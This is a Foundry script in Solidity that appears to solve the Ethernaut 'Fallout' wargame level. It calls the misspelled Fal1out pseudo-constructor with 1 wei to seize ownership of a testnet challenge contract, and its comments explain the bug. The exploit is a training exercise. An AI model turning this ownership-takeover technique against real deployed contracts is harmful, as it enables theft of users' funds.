// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Fallout} from "../src/Fallout.sol";

// $ source .env      # This is to store the environmental variables in the shell session
// $ forge script script/Fallout.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv

contract FalloutSolution is Script {
    // get the environmental variables
    uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
    // this is the instance address created by the ethernaut contract
    address public instance = payable(vm.envAddress("FALLOUT_INSTANCE"));


    /** Attack idea:
        In older contracts, constructors will be a function with the same name as the contract they're in. 
        In newer contracts, the constructor will be labeled as constructor in place of function ContractName.
        Notice that the constructor in the Fallout contract is labeled as Fal1out => it is a normal function. => This is a bug.
     */


    Fallout falloutInstance = Fallout(payable(instance));
    function run() external {

        // call the Fal1out function to gain ownership of the contract
        
        vm.startBroadcast(deployerPrivateKey);
        // we call the fallout function with 1 wei to gain ownership of the contract, notice that we can call collectAllocations to get the balance of the contract back
        // we are not going to call collectAllocations since we are only depositing 1 wei, if we call collectAllocations, we will get 1 wei back but the gas fee will be higher than the 1 wei
        falloutInstance.Fal1out{value: 1}();

        vm.stopBroadcast();
    }

}